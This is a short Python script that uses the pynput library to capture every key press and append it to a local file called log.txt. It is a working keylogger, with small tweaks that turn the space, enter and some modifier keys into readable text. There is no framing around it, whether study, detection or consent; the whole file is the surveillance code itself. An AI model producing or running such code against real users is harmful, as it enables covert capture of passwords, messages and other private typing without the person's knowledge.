from pynput.keyboard import Listener
#import done 

#function for wrriting what we have monitored
def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    with open("log.txt", 'a') as f:
        f.write(letter)

# Collecting events until stopped

with Listener(on_press=write_to_file) as l:
    l.join()



